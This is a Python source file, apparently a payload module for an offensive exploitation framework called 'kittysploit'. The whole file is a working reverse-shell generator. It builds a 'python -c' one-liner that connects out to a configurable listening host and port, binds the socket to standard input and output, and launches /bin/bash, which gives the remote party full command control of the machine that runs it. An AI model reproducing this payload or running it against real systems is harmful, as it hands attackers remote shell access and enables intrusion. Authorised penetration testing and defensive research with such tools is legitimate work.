from kittysploit import *


class Module(Payload):
	
	__info__ = {
			'name': 'Unix Command Shell, Reverse TCP (via Python)',
			'description': 'Connect back and create a command shell via Python',
			'category': 'singles',
			'arch': Arch.PYTHON,
			'listener': 'listeners/multi/reverse_tcp',
			'handler': Handler.REVERSE
		}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(5555, 'Bind Port', True)
	shell_binary = OptString('/bin/bash', 'The system shell in use', True, True)
	python_binary = OptString("python3", "Python binary version", True)
	encoder = OptString("", "Encoder", False, True)


	def generate(self):
		raw_cmd = f"import socket,subprocess,os;host='{self.lhost}';port={self.lport};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call('{self.shell_binary}')"

		return f"{self.python_binary} -c \"{raw_cmd}\""